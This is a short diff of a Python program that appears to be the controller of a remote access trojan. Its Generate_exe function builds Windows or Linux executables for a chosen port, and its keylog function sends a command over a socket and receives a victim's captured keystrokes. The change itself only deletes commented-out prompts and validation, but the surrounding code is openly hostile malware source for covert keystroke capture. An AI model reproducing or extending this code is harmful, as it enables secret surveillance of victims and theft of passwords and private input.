@@ -278,10 +278,6 @@ def Generate_exe():
    ports=str(port)
    print("****EXE GENERATION STAGE****")
    OS=input("Generate executable for(Windows/Linux)?")
-   #while OS is not "Linux" or OS is not "Windows" or OS is not "windows" or OS is not "linux":
-      #print("Please check your selection")
-      #OS=input("Generate executable for(Windows/Linux)?")
-      #return Generate_exe()
    if OS[:7]=="Windows" or OS[:7]=="windows":
       global windows_file
       windows_file=input("Enter file name for executable:")
@@ -424,12 +420,6 @@ def keylog():
    global conn
    insydys= insydys.encode()
    conn.send( insydys)
-   '''keylogtime=input('Enter duration of audio capture(all values taken in seconds)==> ')
-   while keylogtime=="":
-          keylogtime=input('Enter duration of keystroke capture(all values taken in seconds)==> ')
-          
-   conn.send(keylogtime.encode())'''
-   print('recording keystrokes...')
    try:
          keysize=conn.recv(1024)
          sized=keysize.decode()
